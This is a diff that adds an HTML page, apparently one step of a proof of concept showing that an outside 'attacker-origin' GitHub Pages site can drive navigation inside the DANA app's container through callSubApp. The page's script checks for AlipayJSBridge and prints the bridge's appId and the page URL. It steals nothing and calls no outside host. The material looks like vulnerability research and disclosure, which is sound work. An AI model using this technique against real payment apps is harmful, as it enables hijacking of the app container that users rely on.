@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>p2 - container navigation proof</title>
+<style>
+  body{font-family:monospace;background:#200;color:#ff0;padding:20px;font-size:14px}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;color:#0f0;padding:10px;border:1px solid #440}
+</style>
+</head>
+<body>
+<h2>PAGE 2 — opened via callSubApp from foreign page</h2>
+<p>This page was opened by the container navigation bridge (callSubApp), commanded from
+an ATTACKER-ORIGIN page (rfypych.github.io). If you can read this inside the DANA app,
+the container navigation is fully attacker-controlled.</p>
+<pre id="out">checking bridge on this page...</pre>
+<script>
+(function(){
+  function go(){
+    var out=document.getElementById('out');
+    try{
+      var sp=window.AlipayJSBridge&&window.AlipayJSBridge.startupParams;
+      out.textContent='hasAlipayJSBridge: '+!!window.AlipayJSBridge+'\n'+
+        'appId: '+(sp?sp.appId:'n/a')+'\nhref: '+location.href;
+    }catch(e){out.textContent=String(e)}
+  }
+  if(window.AlipayJSBridge){go()}else{
+    document.addEventListener('AlipayJSBridgeReady',go,false);
+    setTimeout(go,3000);
+  }
+})();
+</script>
+</body>
+</html>
